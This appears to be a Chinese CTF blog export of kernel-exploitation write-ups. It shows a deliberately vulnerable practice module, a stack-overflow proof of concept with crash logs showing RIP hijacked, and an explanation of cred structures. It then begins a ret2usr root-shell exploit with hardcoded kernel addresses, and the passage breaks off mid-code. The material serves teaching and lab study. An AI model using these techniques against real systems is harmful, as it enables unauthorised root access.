class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">module_write</span><span class="params">(<span class="keyword">struct</span> file *file,</span></span><br><span class="line"><span class="params">                            <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> count,</span></span><br><span class="line"><span class="params">                            <span class="type">loff_t</span> *f_pos)</span>	</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> kbuf[BUFFER_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_write called\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_copy_from_user(kbuf, buf, count)) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;copy_from_user failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(g_buf, kbuf, BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_close called\n&quot;</span>);</span><br><span class="line">  kfree(g_buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="编写脚本以及利用"><a href="#编写脚本以及利用" class="headerlink" title="编写脚本以及利用"></a>编写脚本以及利用</h2><blockquote>
<p>尝试栈溢出，观察到内核崩溃，程序退出</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fatal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;open(\&quot;/dev/holstein\&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x800</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x800</span>);</span><br><span class="line">  write(fd, buf, <span class="number">0x800</span>);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../../themes/butterfly/source/img/mypic/kernelpwn/%E6%A0%88%E6%BA%A2%E5%87%BA.png" alt="image-20240829161338051"></p>
<blockquote>
<p>主要崩溃原因为：溢出到了保护页，尝试减少溢出</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BUG: <span class="built_in">stack</span> guard page was hit <span class="title function_">at</span> <span class="params">(____ptrval____)</span> <span class="params">(<span class="built_in">stack</span> is (____ptrval____)..(____ptrval____))</span>                                                                                    kernel <span class="built_in">stack</span> <span class="title function_">overflow</span> <span class="params">(page fault)</span>: 0000 [#1] PREEMPT SMP NOPTI    </span><br><span class="line">可惜没有改变RIP的取值</span><br></pre></td></tr></table></figure>

<blockquote>
<p>减少溢出到0x420，可以看到rip被劫持</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">/ # ./exploit</span><br><span class="line">general protection fault: <span class="number">0000</span> [#<span class="number">1</span>] PREEMPT SMP NOPTI</span><br><span class="line">CPU: <span class="number">0</span> PID: <span class="number">163</span> Comm: exploit Tainted: G           O      <span class="number">5.10</span><span class="number">.7</span> #<span class="number">1</span></span><br><span class="line">Hardware name: QEMU Standard <span class="title function_">PC</span> <span class="params">(i440FX + PIIX, <span class="number">1996</span>)</span>, BIOS 1.15.0-1 04/01/2014</span><br><span class="line">RIP: 0010:0x4141414141414141</span><br><span class="line">Code: Unable to access opcode bytes at RIP 0x4141414141414117.</span><br><span class="line">RSP: 0018:ffffc90000443eb8 EFLAGS: 00000202</span><br><span class="line">RAX: 0000000000000420 RBX: ffff888003141900 RCX: 0000000000000000</span><br><span class="line">RDX: 000000000000007f RSI: ffffc90000443ea8 RDI: ffff8880032a9400</span><br><span class="line">RBP: 4141414141414141 R08: ffffffff81ea4608 R09: 0000000000004ffb</span><br><span class="line">R10: 00000000fffff000 R11: 3fffffffffffffff R12: 0000000000000420</span><br><span class="line">R13: 0000000000000000 R14: 00007ffee0caf4e0 R15: ffffc90000443ef8</span><br><span class="line">FS:  00000000004<span class="title function_">cd3c0</span><span class="params">(<span class="number">0000</span>)</span> GS:<span class="title function_">ffff888003800000</span><span class="params">(<span class="number">0000</span>)</span> knlGS:0000000000000000</span><br><span class="line">CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">CR2: 00000000004b4b60 CR3: 00000000032aa000 CR4: 00000000000006f0</span><br><span class="line">Call Trace:</span><br><span class="line"> ? ksys_write+0x53/0xd0</span><br><span class="line"> ? __x64_sys_write+0x15/0x20</span><br><span class="line"> ? do_syscall_64+0x38/0x50</span><br><span class="line"> ? entry_SYSCALL_64_after_hwframe+0x44/0xa9</span><br><span class="line">Modules linked in: <span class="title function_">vuln</span><span class="params">(O)</span></span><br><span class="line">---[ end trace 61f5f4af6b064506 ]---</span><br><span class="line">RIP: 0010:0x4141414141414141</span><br><span class="line">Code: Unable to access opcode bytes at RIP 0x4141414141414117.</span><br><span class="line">RSP: 0018:ffffc90000443eb8 EFLAGS: 00000202</span><br><span class="line">RAX: 0000000000000420 RBX: ffff888003141900 RCX: 0000000000000000</span><br><span class="line">RDX: 000000000000007f RSI: ffffc90000443ea8 RDI: ffff8880032a9400</span><br><span class="line">RBP: 4141414141414141 R08: ffffffff81ea4608 R09: 0000000000004ffb</span><br><span class="line">R10: 00000000fffff000 R11: 3fffffffffffffff R12: 0000000000000420</span><br><span class="line">R13: 0000000000000000 R14: 00007ffee0caf4e0 R15: ffffc90000443ef8</span><br><span class="line">FS:  00000000004<span class="title function_">cd3c0</span><span class="params">(<span class="number">0000</span>)</span> GS:<span class="title function_">ffff888003800000</span><span class="params">(<span class="number">0000</span>)</span> knlGS:0000000000000000</span><br><span class="line">CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">CR2: 00000000004b4b60 CR3: 00000000032aa000 CR4: 00000000000006f0</span><br><span class="line">Kernel panic - not syncing: Fatal exception</span><br><span class="line">Kernel Offset: disabled</span><br></pre></td></tr></table></figure>











]]></content>
      <categories>
        <category>ctf</category>
        <category>kernel</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Kernel(Local Privilege Escalation)</title>
    <url>/2024/08/19/kernelstack/</url>
    <content><![CDATA[<p>摘抄自<a href="https://pawnyable.cafe/linux-kernel/introduction/security.html">https://pawnyable.cafe/linux-kernel/introduction/security.html</a></p>
<p>部分参考：<a href="http://video.mobisys.cc/materials/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3linux%E5%86%85%E6%A0%B8.pdf">深入理解LINUX内核</a></p>
<p><a href="https://yuanfentiank789.github.io/2016/12/31/security1/">https://yuanfentiank789.github.io/2016/12/31/security1/</a></p>
<p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/euid-ruid-suid">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/euid-ruid-suid</a></p>
<h2 id="task-struct部分结构"><a href="#task-struct部分结构" class="headerlink" title="task_struct部分结构"></a>task_struct部分结构</h2><blockquote>
<p>主要考虑其中的指向cred的指针</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">/ include / linux / sched.h</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="访问权限相关"><a href="#访问权限相关" class="headerlink" title="访问权限相关"></a>访问权限相关</h2><blockquote>
<p>从 Linux 内核 6.2&#96;&#96; 开始<a href="https://elixir.bootlin.com/linux/v6.2/source/kernel/cred.c#L712">，NULL 不能再传递给 prepare_kernel_cred。</a></p>
<p><code>init_cred</code>仍然存在，因此您可以通过执行 <code>commit_creds （&amp;init_cred）</code> 来进行LPE。</p>
</blockquote>
<h3 id="CRED"><a href="#CRED" class="headerlink" title="CRED"></a>CRED</h3><blockquote>
<p>UID:<strong>真实用户ID</strong> ，表示发起进程的用户</p>
<p>EUID:被称为<strong>有效用户ID</strong> ，它代表系统用来确定进程权限的用户身份。</p>
<p>SUID:当高权限进程（通常以 root 身份运行）需要暂时放弃其权限来执行某些任务，以便稍后恢复其初始提升状态时，此<strong>保存的用户 ID</strong>至关重要。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/include / linux / cred.h </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span> *<span class="title">ucounts</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> /kernel / cred.c</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The initial credentials for the initial task</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">init_cred</span> =</span> &#123;</span><br><span class="line">	.usage			= ATOMIC_INIT(<span class="number">4</span>),</span><br><span class="line">	.uid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.gid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.suid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.sgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.euid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.egid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.fsuid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.fsgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.securebits		= SECUREBITS_DEFAULT,</span><br><span class="line">	.cap_inheritable	= CAP_EMPTY_SET,</span><br><span class="line">	.cap_permitted		= CAP_FULL_SET,</span><br><span class="line">	.cap_effective		= CAP_FULL_SET,</span><br><span class="line">	.cap_bset		= CAP_FULL_SET,</span><br><span class="line">	.user			= INIT_USER,</span><br><span class="line">	.user_ns		= &amp;init_user_ns,</span><br><span class="line">	.group_info		= &amp;init_groups,</span><br><span class="line">	.ucounts		= &amp;init_ucounts,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="cred结构的创建"><a href="#cred结构的创建" class="headerlink" title="cred结构的创建"></a>cred结构的创建</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*5.14.9*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/kernel / cred.c</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!new)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (daemon)</span><br><span class="line">		old = get_task_cred(daemon);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		old = get_cred(&amp;init_cred);</span><br><span class="line"></span><br><span class="line">	validate_creds(old);</span><br><span class="line"></span><br><span class="line">	*new = *old;</span><br><span class="line">	new-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">	<span class="type">atomic_set</span>(&amp;new-&gt;usage, <span class="number">1</span>);</span><br><span class="line">	set_cred_subscribers(new, <span class="number">0</span>);</span><br><span class="line">	get_uid(new-&gt;user);</span><br><span class="line">	get_user_ns(new-&gt;user_ns);</span><br><span class="line">	get_group_info(new-&gt;group_info);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	new-&gt;session_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	new-&gt;process_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	new-&gt;thread_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	new-&gt;request_key_auth = <span class="literal">NULL</span>;</span><br><span class="line">	new-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	new-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	new-&gt;ucounts = get_ucounts(new-&gt;ucounts);</span><br><span class="line">	<span class="keyword">if</span> (!new-&gt;ucounts)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (security_prepare_creds(new, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	put_cred(old);</span><br><span class="line">	validate_creds(new);</span><br><span class="line">	<span class="keyword">return</span> new;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">	put_cred(new);</span><br><span class="line">	put_cred(old);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="cred的更改"><a href="#cred的更改" class="headerlink" title="cred的更改"></a>cred的更改</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/kernel / cred.c</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;commit_creds(%p&#123;%ld&#125;)&quot;</span>, new,</span><br><span class="line">	       atomic_long_read(&amp;new-&gt;usage));</span><br><span class="line"></span><br><span class="line">	BUG_ON(task-&gt;cred != old);</span><br><span class="line">	BUG_ON(atomic_long_read(&amp;new-&gt;usage) &lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	get_cred(new); <span class="comment">/* we will require a ref for the subj creds too */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* dumpability changes */</span></span><br><span class="line">	<span class="keyword">if</span> (!uid_eq(old-&gt;euid, new-&gt;euid) ||</span><br><span class="line">	    !gid_eq(old-&gt;egid, new-&gt;egid) ||</span><br><span class="line">	    !uid_eq(old-&gt;fsuid, new-&gt;fsuid) ||</span><br><span class="line">	    !gid_eq(old-&gt;fsgid, new-&gt;fsgid) ||</span><br><span class="line">	    !cred_cap_issubset(old, new)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (task-&gt;mm)</span><br><span class="line">			set_dumpable(task-&gt;mm, suid_dumpable);</span><br><span class="line">		task-&gt;pdeath_signal = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If a task drops privileges and becomes nondumpable,</span></span><br><span class="line"><span class="comment">		 * the dumpability change must become visible before</span></span><br><span class="line"><span class="comment">		 * the credential change; otherwise, a __ptrace_may_access()</span></span><br><span class="line"><span class="comment">		 * racing with this change may be able to attach to a task it</span></span><br><span class="line"><span class="comment">		 * shouldn&#x27;t be able to attach to (as if the task had dropped</span></span><br><span class="line"><span class="comment">		 * privileges without becoming nondumpable).</span></span><br><span class="line"><span class="comment">		 * Pairs with a read barrier in __ptrace_may_access().</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		smp_wmb();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* alter the thread keyring */</span></span><br><span class="line">	<span class="keyword">if</span> (!uid_eq(new-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">		key_fsuid_changed(new);</span><br><span class="line">	<span class="keyword">if</span> (!gid_eq(new-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">		key_fsgid_changed(new);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* do it</span></span><br><span class="line"><span class="comment">	 * RLIMIT_NPROC limits on user-&gt;processes have already been checked</span></span><br><span class="line"><span class="comment">	 * in set_user().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (new-&gt;user != old-&gt;user || new-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">		inc_rlimit_ucounts(new-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line">	rcu_assign_pointer(task-&gt;real_cred, new);</span><br><span class="line">	rcu_assign_pointer(task-&gt;cred, new);</span><br><span class="line">	<span class="keyword">if</span> (new-&gt;user != old-&gt;user || new-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">		dec_rlimit_ucounts(old-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* send notifications */</span></span><br><span class="line">	<span class="keyword">if</span> (!uid_eq(new-&gt;uid,   old-&gt;uid)  ||</span><br><span class="line">	    !uid_eq(new-&gt;euid,  old-&gt;euid) ||</span><br><span class="line">	    !uid_eq(new-&gt;suid,  old-&gt;suid) ||</span><br><span class="line">	    !uid_eq(new-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">		proc_id_connector(task, PROC_EVENT_UID);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!gid_eq(new-&gt;gid,   old-&gt;gid)  ||</span><br><span class="line">	    !gid_eq(new-&gt;egid,  old-&gt;egid) ||</span><br><span class="line">	    !gid_eq(new-&gt;sgid,  old-&gt;sgid) ||</span><br><span class="line">	    !gid_eq(new-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">		proc_id_connector(task, PROC_EVENT_GID);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* release the old obj and subj refs both */</span></span><br><span class="line">	put_cred_many(old, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="返回到用户空间"><a href="#返回到用户空间" class="headerlink" title="返回到用户空间"></a>返回到用户空间</h2><blockquote>
<p>在 Kernel Exploit 中，我们创建了触发漏洞的程序（进程），因此我们可以通过在 ROP 结束后将 RSP 返回到用户空间，并将 RIP 设置为接受 shell 的函数来返回用户空间。这是一种从用户空间移动到内核空间的方法，但这是通过 CPU 指令切换特权模式来实现的。 从用户空间到内核空间的唯一方法通常是系统调用 <code>syscall</code> 和中断 <code>int</code>。 而要从内核空间返回到用户空间，通常使用 <code>sysretq</code> 和 <code>iretq</code> 指令。 <code>由于 iretq</code> 比 <code>sysretq</code> 更简单，因此内核漏洞利用通常使用 <code>iretq</code>。 此外，从内核返回到用户空间时，必须从内核模式 GS 段切换到用户模式 GS 段。 为此，Intel 提供了 <code>swapgs</code> 指令。</p>
<p>除了用户空间 RSP 和 RIP 之外，还必须将 CS、SS 和 RFLAGS 转换回用户空间 RSP。 RSP 可以位于任何位置，并且 RIP 可以设置为启动 shell 的函数。 其余的 registers 可以用于它们最初在 user space 中的值，所以让我们准备一个辅助函数来存储 registers 的值，如下所示。 </p>
</blockquote>
<h2 id="实现1-无保护"><a href="#实现1-无保护" class="headerlink" title="实现1.(无保护)"></a>实现1.(无保护)</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_ss, user_rsp, user_rflags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> prepare_kernel_cred = <span class="number">0xffffffff8106e240</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> commit_creds = <span class="number">0xffffffff8106e390</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> *argv[] = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="type">char</span> *envp[] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] win!&quot;</span>);</span><br><span class="line">  execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, envp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span>(</span><br><span class="line">      <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">      <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">      <span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line">      <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">      <span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">      : <span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rsp), <span class="string">&quot;=r&quot;</span>(user_rflags)</span><br><span class="line">      :</span><br><span class="line">      : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">restore_state</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;swapgs ;&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %0, 0x20(%%rsp)\t\n&quot;</span></span></span><br><span 